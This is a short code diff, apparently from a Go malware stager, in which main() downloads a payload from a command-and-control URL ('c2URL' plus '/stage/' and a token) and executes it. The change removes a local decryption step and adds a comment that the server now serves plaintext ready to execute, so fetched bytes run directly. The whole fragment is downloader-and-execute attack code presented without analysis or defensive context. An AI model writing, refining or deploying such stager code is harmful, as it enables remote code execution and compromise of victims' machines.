@@ -34,6 +34,7 @@ func main() {
 	}
 
 	url := c2URL + "/stage/" + stageToken
+	// Server decrypts before serving — received bytes are ready-to-execute plaintext.
 	payload, err := download(url)
 	if err != nil {
 		os.Exit(1)
@@ -42,12 +43,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	plaintext, err := decrypt(encKey, payload)
-	if err != nil {
-		os.Exit(1)
-	}
-
-	if err := execute(plaintext); err != nil {
+	if err := execute(payload); err != nil {
 		os.Exit(1)
 	}
 }
